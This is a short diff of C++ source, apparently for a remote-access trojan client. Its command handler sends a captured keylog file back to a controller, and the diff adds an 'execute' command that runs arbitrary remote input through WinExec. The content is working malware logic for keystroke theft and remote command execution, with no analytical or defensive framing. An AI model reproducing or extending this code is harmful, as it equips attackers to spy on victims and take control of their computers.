@@ -58,10 +58,14 @@ void handle_command(CLIENT& client, string& command)
 	}
 	else if(command.substr(0,6) == "speak ")
 	{ 
-		client.speak_command(command.substr((size_t)6));
+		client.speak_command(command.substr(6));
 	}
 	else if(command == "dump keylogs")
 	{
 		client.send_file("C:\\ender\\log.txt");
+	}
+	else if(command.substr(0,8) == "execute ")
+	{
+		WinExec(command.substr(8).c_str(), SW_SHOW);
 	}
 }
